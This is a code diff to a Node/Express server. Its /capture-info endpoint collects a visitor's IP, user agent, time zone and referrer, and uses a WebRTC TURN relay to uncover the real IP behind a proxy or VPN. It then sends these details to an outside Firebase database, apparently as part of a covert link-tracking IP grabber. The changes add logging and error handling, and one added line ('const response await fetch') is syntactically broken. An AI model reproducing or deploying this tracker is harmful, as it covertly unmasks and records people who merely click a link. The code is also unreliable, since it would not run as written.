@@ -46,6 +46,8 @@ const iceConfiguration = {
 };
 
 app.post('/capture-info', async (req, res) => {
+	try {
+	console.log('Received request on /capture-info with data:', req.body);
     const { timeZone, referrer } = req.body;
     const ipFromHeaders = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     const userAgent = req.headers['user-agent'];
@@ -56,6 +58,7 @@ app.post('/capture-info', async (req, res) => {
     const pc = new wrtc.RTCPeerConnection(iceConfiguration);
 
     pc.onicecandidate = async (event) => {
+		console.log('Received onicecandidate event:', event.candidate);
         if (event.candidate) {
             // Якщо це ваш TURN сервер, то отримана IP адреса є реальним IP користувача
             let match = /relay\sip\s([0-9.]+)/.exec(event.candidate.candidate);
@@ -64,7 +67,7 @@ app.post('/capture-info', async (req, res) => {
                 pc.close(); // Розриваємо з'єднання
 
                 // Зберігаємо дані в Firebase
-                await fetch('https://storagefortrash-default-rtdb.europe-west1.firebasedatabase.app/relink/' + dateTime + '.json', {
+                const response await fetch('https://storagefortrash-default-rtdb.europe-west1.firebasedatabase.app/relink/' + dateTime + '.json', {
                     method: 'PUT',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -76,6 +79,7 @@ app.post('/capture-info', async (req, res) => {
                         referrer: referrer
                     }),
                 });
+				console.log('Response from Firebase:', await response.text());
                 
                 res.status(200).send('Info captured');
             }
@@ -84,6 +88,10 @@ app.post('/capture-info', async (req, res) => {
 
     pc.createDataChannel(''); 
     pc.createOffer().then(offer => pc.setLocalDescription(offer));
+	} catch (error) {
+        console.error('Error in /capture-info:', error);
+        res.status(500).send('Internal server error');
+    }
 });
 
 app.get('/relink', (req, res) => {
